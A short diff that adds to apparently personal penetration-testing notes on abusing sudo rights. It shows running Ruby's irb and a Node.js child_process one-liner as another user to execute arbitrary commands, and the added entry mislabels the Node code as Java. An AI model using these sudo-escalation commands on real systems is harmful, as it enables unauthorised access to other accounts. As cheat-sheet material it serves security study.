@@ -113,6 +113,12 @@ SUDO got privilige to run RUBY as other user
 irb(main):005:0> `id` (znaczek koło tyldy)
 => "uid=1001(victim) gid=1001(victim) groups=1001(victim)\n"
 
+SUDO got privilige to run JAVA as other user
+- sudo -u victim node -e "var exec = require('child_process').exec;
+exec('[COMMAND]', function (error, stdOut, stdErr) {
+console.log(stdOut);
+});"
+
 6. Path 
 - printenv
 
